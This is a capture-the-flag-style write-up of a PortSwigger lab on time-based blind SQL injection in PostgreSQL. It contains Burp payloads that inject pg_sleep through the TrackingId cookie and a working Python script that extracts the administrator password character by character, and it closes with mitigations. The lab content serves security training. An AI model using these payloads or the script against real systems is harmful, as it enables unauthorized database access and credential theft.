# Blind SQL Injection with Time Delays

**Difficulty:** Practitioner  
**Lab Source:** PortSwigger Web Security Academy  
**Category:** SQL Injection — Blind / Time-Based  
**Database:** PostgreSQL  
**Status:** Solved ✅

---

## Overview

This lab contains a **time-based blind SQL injection** vulnerability in the `TrackingId` cookie on a **PostgreSQL** backend.

Unlike boolean-based blind SQLi, there is **zero visible difference** in the HTTP response — no "Welcome back", no error, nothing. The only oracle is **response timing**:

| Condition | Behaviour |
|---|---|
| TRUE | `pg_sleep(10)` fires → response delays ~10 seconds |
| FALSE | `pg_sleep(0)` fires → response returns immediately |

**Goal:** Extract the `administrator` password from the `users` table and log in.

---

## Key Concepts

| Concept | Description |
|---|---|
| Time-based blind SQLi | Response content never changes — only timing differs |
| `pg_sleep(n)` | PostgreSQL: pause execution for `n` seconds |
| `CASE WHEN ... THEN ... ELSE ... END` | Conditional branching on true/false |
| `SUBSTRING(str, pos, len)` | Extract one character at a time |
| Stacked queries (`;`) | PostgreSQL supports multiple statements via `;` |
| String concatenation (`\|\|`) | PostgreSQL concat operator — used in the Python script |
| `%3B` | URL encoding of `;` (used in Burp payloads) |

---

## Vulnerability

The `TrackingId` cookie value is inserted unsanitised into a SQL query. PostgreSQL supports **stacked queries** (multiple statements separated by `;`), so a second injected statement executes independently — and its timing is reflected in the HTTP response time.

---

## Manual Exploitation (Burp Suite)

### Step 1 — Confirm Time Delay

True condition → 10 second delay:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

False condition → immediate response:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
```

### Step 2 — Confirm `administrator` User Exists

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
10 second delay → user `administrator` confirmed ✅

### Step 3 — Determine Password Length

Increment until response stops delaying:
```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
...
```
When response becomes immediate → **password = 20 characters**

### Step 4 — Extract Each Character (Burp Intruder)

```
TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

> ⚠️ Burp **Community** Intruder is rate-throttled AND each request waits up to 10 seconds. Use the Python script instead — it finishes in minutes.

---

## Automated Exploitation — Python Script

The script uses **string concatenation injection** (`||`) — more portable than stacked queries and reliable across PostgreSQL configs:

```python
import requests
import string
import time

url = "https://0ab2009c04b2502b8027e48000160095.web-security-academy.net/"

tracking_id = "51sua3nyQiEwB5th"
session_cookie = "QULyXGpc9KXIWEfVBR3Rbx9ndp6qk5Vq"

charset = string.ascii_lowercase + string.digits
password = ""

headers = {
    "User-Agent": "Mozilla/5.0",
    "Referer": url
}

def test_char(position, char):
    payload = (
        f"{tracking_id}'||("
        f"SELECT CASE WHEN (username='administrator' AND substring(password,{position},1)='{char}') "
        f"THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users"
        f")||'--"
    )
    cookies = {"TrackingId": payload, "session": session_cookie}
    start = time.time()
    requests.get(url, cookies=cookies, headers=headers)
    elapsed = time.time() - start
    return elapsed > 2.5


for position in range(1, 21):
    print(f"[+] Position {position}")
    for char in charset:
        if test_char(position, char):
            print(f"[✔] Found: {char}")
            password += char
            break

print(f"\n🔥 Password: {password}")
```

> **Note:** `tracking_id` and `session_cookie` are unique per lab instance — update them each session.

---

## Payload Breakdown

```
51sua3nyQiEwB5th'||(SELECT CASE WHEN (username='administrator' AND substring(password,1,1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)||'--
```

| Part | Role |
|---|---|
| `51sua3nyQiEwB5th'` | Closes the original string literal |
| `\|\|(...)` | Concatenates subquery result back into the string |
| `CASE WHEN ... THEN pg_sleep(3) ELSE pg_sleep(0) END` | Conditional time delay |
| `FROM users` | Scopes the condition to the users table |
| `)\|\|'--` | Reopens the string, comments out the rest |

---

## Stacked Query vs Concatenation Injection

| Technique | Style | Notes |
|---|---|---|
| Stacked query | `x'%3BSELECT ...--` | Uses `%3B` for `;`, requires stacked query support |
| String concatenation | `x'\|\|(SELECT ...)--` | Works inline, no stacked query needed — used in script |

---

## Why Python Over Burp Community Intruder?

| Method | Speed | Notes |
|---|---|---|
| Burp Community Intruder | Very slow | Rate-throttled + 10s per request = hours |
| Burp Pro Intruder | Fast | No throttle, paid license required |
| Python `requests` | Fast | Free, 3s threshold, finishes in minutes |

---

## Files in This Repo

| File | Description |
|---|---|
| `README.md` | This writeup |
| `time_based_sqli.py` | Python automation script |
| `Time_Based_SQLi_Writeup.docx` | Full Word document writeup |

---

## Mitigations

- **Parameterized queries** — User input treated as data, never as SQL. The complete fix.
- **Least privilege** — DB user should have no access to `users` table or `pg_sleep`
- **Cookie integrity** — Sign/encrypt tracking cookies to prevent tampering
- **WAF** — Detect `pg_sleep`, `CASE WHEN`, and time-delay patterns in cookie values
